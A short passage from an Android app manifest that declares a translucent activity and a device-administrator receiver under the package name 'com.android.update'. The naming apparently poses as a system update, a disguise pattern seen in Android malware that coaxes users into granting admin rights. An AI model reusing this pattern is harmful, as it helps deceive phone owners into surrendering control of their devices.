        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTask" android:name="com.android.update.DeviceAdminActtivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Translucent"/>
        <receiver android:description="@string/app_name" android:label="@string/app_name" android:name="com.android.update.deviceAdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
            </intent-filter>
        </receiver>
